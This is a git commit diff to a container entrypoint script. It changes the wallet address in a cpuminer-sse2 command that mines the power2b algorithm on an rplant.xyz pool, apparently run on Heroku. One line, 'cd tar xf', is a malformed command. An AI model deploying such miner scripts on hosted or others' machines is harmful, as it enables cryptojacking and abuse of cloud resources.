d79ce5306502a0371c2c3a66699f5533373642d4
dwi4028 <78636080+dwi4028@users.noreply.github.com>
2021-02-11 08:31:06 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -4,4 +4,4 @@ cd /cpuminer-sse2
   
     
      cd tar xf cpuminer-opt-linux.tar.gz
-    ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u McbJjK7K11nXrrqnD41MByr1xT3JgS2U6A.mahmedgans -t3
+    ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.heroku -t3
